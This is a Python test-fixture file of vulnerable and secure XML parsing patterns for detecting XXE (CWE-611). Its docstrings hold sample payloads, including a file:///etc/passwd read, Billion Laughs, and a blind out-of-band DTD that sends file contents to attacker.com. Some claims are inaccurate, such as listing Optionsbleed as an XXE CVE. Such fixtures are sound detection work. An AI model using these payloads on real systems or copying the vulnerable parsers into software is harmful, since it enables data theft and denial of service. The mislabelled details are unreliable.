"""
XML External Entity (XXE) Test Fixtures

CWE-611: XXE
CVE-2017-9798: Apache Optionsbleed (XXE component)
CVE-2018-1000613: Jenkins XXE vulnerability
"""

import xml.etree.ElementTree as ET
from xml.dom import minidom

# Optional imports (install with: pip install codegraph[cwe])
try:
    import lxml.etree as lxml_etree

    HAS_LXML = True
except ImportError:
    HAS_LXML = False

try:
    import defusedxml.ElementTree as DefusedET

    HAS_DEFUSEDXML = True
except ImportError:
    HAS_DEFUSEDXML = False


# ==================================================
# VULNERABLE: xml.etree.ElementTree (default)
# ==================================================


def xxe_vulnerable_1_etree(xml_data: str):
    """
    ❌ CRITICAL: XXE with ElementTree

    Real attack:
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>

    Result: Reads /etc/passwd
    """
    # VULNERABLE: Parses external entities by default
    tree = ET.fromstring(xml_data)  # SINK: ET.fromstring

    return tree.text


def xxe_vulnerable_2_parse_file(xml_file_path: str):
    """
    ❌ CRITICAL: XXE via file parsing
    """
    # VULNERABLE
    tree = ET.parse(xml_file_path)  # SINK: ET.parse
    root = tree.getroot()

    return root.text


# ==================================================
# VULNERABLE: xml.dom.minidom
# ==================================================


def xxe_vulnerable_3_minidom(xml_data: str):
    """
    ❌ CRITICAL: XXE with minidom

    Real attack:
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "http://attacker.com/steal?data=">
        ]>

    Result: SSRF attack
    """
    # VULNERABLE: minidom also parses entities
    doc = minidom.parseString(xml_data)  # SINK: minidom.parseString

    return doc.toxml()


# ==================================================
# VULNERABLE: lxml (default)
# ==================================================


def xxe_vulnerable_4_lxml(xml_data: str):
    """
    ❌ CRITICAL: XXE with lxml

    Real attack (Billion Laughs):
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <root>&lol3;</root>

    Result: Denial of Service (exponential entity expansion)
    """
    if not HAS_LXML:
        raise ImportError("lxml not installed. Install with: pip install codegraph[cwe]")

    # VULNERABLE: lxml default parser
    tree = lxml_etree.fromstring(xml_data.encode())  # SINK: lxml.fromstring

    return tree.text


def xxe_vulnerable_5_lxml_parse(xml_file: str):
    """
    ❌ CRITICAL: lxml file parsing
    """
    # VULNERABLE
    tree = lxml_etree.parse(xml_file)  # SINK: lxml.parse

    return tree.getroot().text


# ==================================================
# VULNERABLE: Complex XXE attacks
# ==================================================


def xxe_vulnerable_6_blind_xxe(xml_data: str):
    """
    ❌ CRITICAL: Blind XXE (out-of-band)

    Real attack:
        <!DOCTYPE foo [
          <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
          %xxe;
        ]>

    evil.dtd:
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
        %eval;
        %exfil;
    """
    # VULNERABLE: Blind XXE
    tree = ET.fromstring(xml_data)  # SINK

    return "Processed"


def xxe_vulnerable_7_parameter_entity(xml_data: str):
    """
    ❌ CRITICAL: Parameter entity attack
    """
    # VULNERABLE: Parameter entities
    parser = lxml_etree.XMLParser()
    tree = lxml_etree.fromstring(xml_data.encode(), parser)  # SINK

    return tree.text


# ==================================================
# SAFE: Disable external entities (BEST PRACTICE)
# ==================================================


def xxe_safe_1_etree_secure(xml_data: str):
    """
    ✅ SECURE: Disable external entities in ElementTree

    Note: ElementTree in Python 3.8+ disables DTD by default
    """
    # SAFE: Explicitly disable entities
    parser = ET.XMLParser()
    parser.entity = {}  # Disable entity expansion

    tree = ET.fromstring(xml_data, parser=parser)

    return tree.text


def xxe_safe_2_defusedxml(xml_data: str):
    """
    ✅ SECURE: Use defusedxml library (RECOMMENDED)

    defusedxml protects against:
    - XXE
    - Billion Laughs
    - Quadratic blowup
    - DTD retrieval
    """
    if not HAS_DEFUSEDXML:
        raise ImportError("defusedxml not installed. Install with: pip install codegraph[cwe]")

    # SAFE: defusedxml blocks XXE
    tree = DefusedET.fromstring(xml_data)

    return tree.text


def xxe_safe_3_defusedxml_parse(xml_file: str):
    """
    ✅ SECURE: defusedxml file parsing
    """
    # SAFE
    tree = DefusedET.parse(xml_file)
    root = tree.getroot()

    return root.text


# ==================================================
# SAFE: lxml secure parser
# ==================================================


def xxe_safe_4_lxml_secure(xml_data: str):
    """
    ✅ SECURE: lxml with secure parser settings
    """
    # SAFE: Disable all dangerous features
    parser = lxml_etree.XMLParser(
        resolve_entities=False,  # Disable entity resolution
        no_network=True,  # Disable network access
        dtd_validation=False,  # Disable DTD validation
        load_dtd=False,  # Don't load DTD
    )

    tree = lxml_etree.fromstring(xml_data.encode(), parser)

    return tree.text


def xxe_safe_5_lxml_html(html_data: str):
    """
    ✅ SECURE: lxml HTML parser (safer than XML)
    """
    from lxml import html

    # SAFE: HTML parser doesn't process entities
    doc = html.fromstring(html_data)

    return doc.text_content()


# ==================================================
# SAFE: Alternative parsers
# ==================================================


def xxe_safe_6_json_instead(json_data: str):
    """
    ✅ SECURE: Use JSON instead of XML

    Best practice: Avoid XML if possible
    """
    import json

    # SAFE: JSON has no XXE vulnerability
    data = json.loads(json_data)

    return data


def xxe_safe_7_yaml_safe(yaml_data: str):
    """
    ✅ SECURE: YAML (with safe_load)
    """
    import yaml

    # SAFE: yaml.safe_load
    data = yaml.safe_load(yaml_data)

    return data


# ==================================================
# SAFE: Input validation
# ==================================================


def xxe_safe_8_validate_xml(xml_data: str):
    """
    ✅ SECURE: Validate XML structure
    """
    # Reject XML with DOCTYPE
    if "<!DOCTYPE" in xml_data or "<!ENTITY" in xml_data:
        raise ValueError("DOCTYPE not allowed")

    # Use secure parser
    return xxe_safe_2_defusedxml(xml_data)


def xxe_safe_9_schema_validation(xml_data: str):
    """
    ✅ SECURE: XML Schema validation
    """
    from defusedxml import lxml as defused_lxml

    # Define allowed schema
    schema_xml = """
    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
        <xs:element name="root">
            <xs:complexType>
                <xs:sequence>
                    <xs:element name="item" type="xs:string"/>
                </xs:sequence>
            </xs:complexType>
        </xs:element>
    </xs:schema>
    """

    # Parse schema
    schema_doc = lxml_etree.fromstring(schema_xml.encode())
    schema = lxml_etree.XMLSchema(schema_doc)

    # Parse and validate XML
    parser = lxml_etree.XMLParser(resolve_entities=False)
    doc = lxml_etree.fromstring(xml_data.encode(), parser)

    # SAFE: Validate against schema
    if not schema.validate(doc):
        raise ValueError("Invalid XML structure")

    return doc


# ==================================================
# SAFE: REST API patterns
# ==================================================


def xxe_safe_10_soap_alternative():
    """
    ✅ SECURE: Use REST/JSON instead of SOAP/XML
    """
    # SAFE: Modern REST API with JSON
    from flask import Flask, jsonify, request

    app = Flask(__name__)

    @app.route("/api/data", methods=["POST"])
    def handle_data():
        # SAFE: JSON input
        data = request.get_json()

        # Process data
        result = process_data(data)

        return jsonify(result)


# ==================================================
# SAFE: Django XML handling
# ==================================================


def xxe_safe_11_django_xml(xml_data: str):
    """
    ✅ SECURE: Django with defusedxml
    """
    from defusedxml.ElementTree import fromstring

    # SAFE: defusedxml in Django
    tree = fromstring(xml_data)

    # Extract data safely
    items = [elem.text for elem in tree.findall(".//item")]

    return items


# ==================================================
# Real-world patterns
# ==================================================


def xxe_safe_12_soap_service(soap_xml: str):
    """
    ✅ SECURE: SOAP service with XXE protection
    """
    from defusedxml.ElementTree import fromstring

    # Validate input
    if len(soap_xml) > 1_000_000:  # 1MB limit
        raise ValueError("XML too large")

    if "<!DOCTYPE" in soap_xml or "<!ENTITY" in soap_xml:
        raise ValueError("DOCTYPE/ENTITY not allowed")

    # SAFE: Parse with defusedxml
    tree = fromstring(soap_xml)

    # Extract SOAP body
    body = tree.find(".//{http://schemas.xmlsoap.org/soap/envelope/}Body")

    if body is None:
        raise ValueError("Invalid SOAP message")

    return body


# Helper
def process_data(data: dict):
    """Mock data processor"""
    return {"status": "processed", "data": data}
